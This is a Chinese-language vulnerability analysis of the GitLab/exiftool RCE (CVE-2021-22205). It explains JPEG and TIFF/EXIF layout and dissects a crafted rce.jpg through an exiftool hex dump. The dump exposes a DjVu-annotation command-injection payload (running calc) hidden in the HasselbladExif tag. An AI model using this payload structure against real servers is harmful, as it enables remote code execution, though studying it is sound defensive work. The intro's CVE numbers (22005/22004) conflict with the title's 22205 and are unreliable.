**作者：AirSky@天融信阿尔法实验室  
原文链接：**
## 0x01 前言
安全研究员`vakzz`于4月7日在hackerone上提交了一个关于gitlab的 **RCE漏洞**
[1]，在当时并没有提及是否需要登录gitlab进行授权利用，在10月25日该漏洞被国外安全公司通过日志分析发现未授权的 **在野利用**
[2]，并发现了新的利用方式。根据官方 **漏洞通告** [3]页面得知安全的版本为13.10.3、13.9.6 和
13.8.8。该漏洞分为两个部分，分别是：
  * CVE-2021-22005 Gitlab 未授权
  * exiftool RCE CVE-2021-22004
上一篇[CVE-2021-22205 GitLab
RCE之未授权访问深入分析(一)](http://mp.weixin.qq.com/s?__biz=Mzg3MDAzMDQxNw==&mid=2247491418&idx=1&sn=853be1256de894c3c579a07738c11590&chksm=ce955264f9e2db725ff2fa08cdf3cdb77f9c45181b9ca4b12d997b0fa7259307975f5a399cbb&scene=21#wechat_redirect)复现分析了第一部分也就是携带恶意文件的请求是如何通过gitlab传递到exiftool进行解析的，
**接下来我将分析exiftool漏洞的原理和最后的触发利用。** 希望读者能读有所得，从中收获到自己独特的见解。
## 0x01 前置知识
同样的我也会在本篇文章中梳理一些前置知识来让读者更深入的了解漏洞，举一反三。
### JPEG文件格式
本次漏洞可以通过读取正常的JPG图像文件的EXIF信息来触发漏洞，而JPEG的文件格式直接定义了exiftool是如何来读取jpg文件的exif信息，其中就包含了触发漏洞的payload。所以我们有必要了解一下payload是如何被插入到JPG文件中又是怎么被读取到的，而不影响图片的正常显示。
下面就来一探究竟，使用010
Editor打开一张带有payload的图片查看其文件格式，选择jpg模版之后在下图中可以看到，上方的Hex数据内容分别对应着下方模版结果栏存在的几个标记段。
每个标记段通过`Marker`来定位，如`Marker`为`SOI（Start Of
Image）`的内容是`0xFFD8`，`Marker`为`APP0~APP15`的内容是`0xFFE0 ~ 0xFFEF`，`Marker`的长度为固定的
2 Byte。除了开头和结尾的`Marker`外，其余的数据段格式为：
    Marker Number(2 byte) + Data size(2 bytes) + Data((Size-2) bytes)
Marker后面两个字节`Data
size`表示存储Marker的数据段长度。如上图表示APP0长度为16，APP1长度为210。大家可以看到APP0和APP1所表示的结构不太一样，那是因为它们使用了不同的文件格式，前者为JFIF后者为Exif，它们都是遵循JIF标准的。所有的Exif数据都储存在APP1数据段中。Exif数据部分采用TIFF格式组织，做为一种标记语言，TIFF与其他文件格式最大的不同在于除了图像数据，它还可以记录很多图像的其他信息。
这里我们重点关注一下APP1数据段，从上图中来看APP1可以分为两个大的部分，第一部分是前三个字段，从FFE1开始分别表示了APP1的位置长度和名称。第二个部分剩下的字段为标准的TIFF格式，TIFF格式主要由三部分组成，分别是图像文件头IFH(Image
File Header)， 图像文件目录IFD(Image File Directory)和目录项DE(Directory Entry)。结构如下：
    +------------------------------------------------------------------------------+
    |                           TIFF Structure                                     |
    |  IFH                                                                         |
    | +------------------+                                                         |
    | | II/MM            |                                                         |
    | +------------------+                                                         |
    | | 42               |      IFD                                                |
    | +------------------+    +------------------+                                 |
    | | Next IFD Address |--->| IFD Entry Num    |                                 |
    | +------------------+    +------------------+                                 |
    |                         | IFD Entry 1      |                                 |
    |                         +------------------+                                 |
    |                         | IFD Entry 2      |                                 |
    |                         +------------------+                                 |
    |                         |                  |      IFD                        |
    |                         +------------------+    +------------------+         |
    |     IFD Entry           | Next IFD Address |--->| IFD Entry Num    |         |
    |    +---------+           +------------------+   +------------------+         |
    |    | Tag     |                                  | IFD Entry 1      |         |
    |    +---------+                                  +------------------+         |
    |    | Type    |                                  | IFD Entry 2      |         |
    |    +---------+                                  +------------------+         |
    |    | Count   |                                  |                  |         |
    |    +---------+                                  +------------------+         |
    |    | Offset  |--->Value                         | Next IFD Address |--->NULL |
    |    +---------+                                  +------------------+         |
    |                                                                              |
    +------------------------------------------------------------------------------+
根据 TIFF Header (上面的IFH)的后四个字节(表示到IFD0的偏移)，我们可以找到第一个IFD。本次示例图的IFD如下：
根据第一个字段我们知道存在5个IFD Entry，分别代表5个exif标签元数据。IFD
Entry的字段分别指出了标签标识符、类型、数量、和内容偏移/内容，而我们的payload正处于第5个标签0xc51b中，在exiftool中这个标签名为HasselbladExif。可以看到其中的`DWORD
offsetData`指向了`struct
strAscii`，这部分内容正是DjVu格式的数据，exiftool解析到`HasselbladExif`这个标签则会调用特定函数递归解析其携带的内容，也就会解析DjVu注释。我们使用exiftool的-v参数也能列出其文件结构，结果如下：
    D:\Desktop\Works\Topsec\hacktips>exiftool-11.94.exe -v10 rce.jpg
      ExifToolVersion = 11.94
      FileName = rce.jpg
      Directory = .
      FileSize = 47343
      FileModifyDate = 1641524876
      FileAccessDate = 1642523214.51503
      FileCreateDate = 1641524902.44145
      FilePermissions = 33206
      FileType = JPEG
      FileTypeExtension = JPG
      MIMEType = image/jpeg
    JPEG APP0 (14 bytes):
        0006: 4a 46 49 46 00 01 01 01 00 48 00 48 00 00       [JFIF.....H.H..]
      + [BinaryData directory, 9 bytes]
      | JFIFVersion = 1 1
      | - Tag 0x0000 (2 bytes, int8u[2]):
      |     000b: 01 01                                           [..]
      | ResolutionUnit = 1
      | - Tag 0x0002 (1 bytes, int8u[1]):
      |     000d: 01                                              [.]
      | XResolution = 72
      | - Tag 0x0003 (2 bytes, int16u[1]):
      |     000e: 00 48                                           [.H]
      | YResolution = 72
      | - Tag 0x0005 (2 bytes, int16u[1]):
      |     0010: 00 48                                           [.H]
      | ThumbnailWidth = 0
      | - Tag 0x0007 (1 bytes, int8u[1]):
      |     0012: 00                                              [.]
      | ThumbnailHeight = 0
      | - Tag 0x0008 (1 bytes, int8u[1]):
      |     0013: 00                                              [.]
    JPEG APP1 (208 bytes):
        0018: 45 78 69 66 00 00 4d 4d 00 2a 00 00 00 08 00 05 [Exif..MM.*......]
        0028: 01 1a 00 05 00 00 00 01 00 00 00 4a 01 1b 00 05 [...........J....]
        0038: 00 00 00 01 00 00 00 52 01 28 00 03 00 00 00 01 [.......R.(......]
        0048: 00 02 00 00 02 13 00 03 00 00 00 01 00 01 00 00 [................]
        0058: c5 1b 00 02 00 00 00 6f 00 00 00 5a 00 00 00 00 [.......o...Z....]
        0068: 00 00 00 48 00 00 00 01 00 00 00 48 00 00 00 01 [...H.......H....]
        0078: 41 54 26 54 46 4f 52 4d 00 00 00 62 44 4a 56 55 [AT&TFORM...bDJVU]
        0088: 49 4e 46 4f 00 00 00 0a 00 00 00 00 18 00 2c 01 [INFO..........,.]
        0098: 16 01 42 47 6a 70 00 00 00 22 41 54 26 54 46 4f [..BGjp..."AT&TFO]
        00a8: 52 4d 00 00 00 00 44 4a 56 55 49 4e 46 4f 00 00 [RM....DJVUINFO..]
        00b8: 00 0a 00 00 00 00 18 00 2c 01 16 01 41 4e 54 61 [........,...ANTa]
        00c8: 00 00 00 1a 28 6d 65 74 61 64 61 74 61 20 22 5c [....(metadata "\]
        00d8: 0a 22 2e 60 63 61 6c 63 60 2e 5c 22 67 22 00 00 [.".`calc`.\"g"..]
      ExifByteOrder = MM
      + [IFD0 directory with 5 entries]
      | 0)  XResolution = 72 (72/1)
      |     - Tag 0x011a (8 bytes, rational64u[1]):
      |         0068: 00 00 00 48 00 00 00 01                         [...H....]
      | 1)  YResolution = 72 (72/1)
      |     - Tag 0x011b (8 bytes, rational64u[1]):
      |         0070: 00 00 00 48 00 00 00 01                         [...H....]
      | 2)  ResolutionUnit = 2
      |     - Tag 0x0128 (2 bytes, int16u[1]):
      |         0048: 00 02                                           [..]
      | 3)  YCbCrPositioning = 1
      |     - Tag 0x0213 (2 bytes, int16u[1]):
      |         0054: 00 01                                           [..]
      | 4)  HasselbladExif = AT&TFORMbDJVUINFO..,...BGjp"AT&TFORMDJVUINFO..,...ANTa.(metadata "\.".`calc`.\"g"
      |     - Tag 0xc51b (111 bytes, string[111] read as undef[111]):
      |         0078: 41 54 26 54 46 4f 52 4d 00 00 00 62 44 4a 56 55 [AT&TFORM...bDJVU]
      |         0088: 49 4e 46 4f 00 00 00 0a 00 00 00 00 18 00 2c 01 [INFO..........,.]
      |         0098: 16 01 42 47 6a 70 00 00 00 22 41 54 26 54 46 4f [..BGjp..."AT&TFO]
      |         00a8: 52 4d 00 00 00 00 44 4a 56 55 49 4e 46 4f 00 00 [RM....DJVUINFO..]
      |         00b8: 00 0a 00 00 00 00 18 00 2c 01 16 01 41 4e 54 61 [........,...ANTa]
      |         00c8: 00 00 00 1a 28 6d 65 74 61 64 61 74 61 20 22 5c [....(metadata "\]
      |         00d8: 0a 22 2e 60 63 61 6c 63 60 2e 5c 22 67 22 00    [.".`calc`.\"g".]
      | FileType = DJVU
      | FileTypeExtension = DJVU
      | MIMEType = image/vnd.djvu
    AIFF 'INFO' chunk (10 bytes of data): 24
      | INFO (SubDirectory) -->
      | - Tag 'INFO' (10 bytes):
      |     0018: 00 00 00 00 18 00 2c 01 16 01                   [......,...]
      | + [BinaryData directory, 10 bytes]
      | | ImageWidth = 0
      | | - Tag 0x0000 (2 bytes, int16u[1]):
      | |     0018: 00 00                                           [..]
      | | ImageHeight = 0
      | | - Tag 0x0002 (2 bytes, int16u[1]):
      | |     001a: 00 00                                           [..]
      | | DjVuVersion = 24 0
      | | - Tag 0x0004 (2 bytes, int8u[2]):
      | |     001c: 18 00                                           [..]
      | | SpatialResolution = 11265
      | | - Tag 0x0006 (2 bytes, int16u[1]):
      | |     001e: 2c 01                                           [,.]
      | | Gamma = 22
      | | - Tag 0x0008 (1 bytes, int8u[1]):
      | |     0020: 16                                              [.]
      | | Orientation = 1
      | | - Tag 0x0009, mask 0x07 (1 bytes, int8u[1]):
      | |     0021: 01                                              [.]
    AIFF 'BGjp' chunk (34 bytes of data): 42
      |     0000: 41 54 26 54 46 4f 52 4d 00 00 00 00 44 4a 56 55 [AT&TFORM....DJVU]
      |     0010: 49 4e 46 4f 00 00 00 0a 00 00 00 00 18 00 2c 01 [INFO..........,.]
      |     0020: 16 01                                           [..]
    AIFF 'ANTa' chunk (26 bytes of data): 84
      | ANTa (SubDirectory) -->
      | - Tag 'ANTa' (26 bytes):
      |     0054: 28 6d 65 74 61 64 61 74 61 20 22 5c 0a 22 2e 60 [(metadata "\.".`]
      |     0064: 63 61 6c 63 60 2e 5c 22 67 22                   [calc`.\"g"]
      | | Metadata (SubDirectory) -->
      | | + [Metadata directory with 1 entries]
      | | | Warning = Ignored invalid metadata entry(s)
    JPEG DQT (65 bytes):
        00ec: 00 06 04 05 06 05 04 06 06 05 06 07 07 06 08 0a [................]
        00fc: 10 0a 0a 09 09 0a 14 0e 0f 0c 10 17 14 18 18 17 [................]